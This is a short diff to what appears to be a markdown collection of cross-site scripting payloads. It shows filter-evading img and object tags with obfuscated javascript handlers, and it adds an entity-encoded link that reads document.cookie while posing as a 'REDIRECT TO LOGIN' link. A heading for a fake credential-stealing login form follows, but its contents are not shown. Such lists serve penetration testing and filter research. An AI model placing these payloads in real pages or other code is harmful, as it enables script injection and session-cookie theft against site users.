@@ -16,6 +16,7 @@
 <iMG src onload=%ff%00%ffAAA onerror=alert() />
 <iMG onerror="top['loc\u{61}tion'] = 'javascript:alert\u{28})'" src />
 <oBjECt data="javascript:window['\a\l\ert']()" />
+<a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">REDIRECT TO LOGIN</a>
 ```
 
 ### Fake authentication form sending credentials to remote server
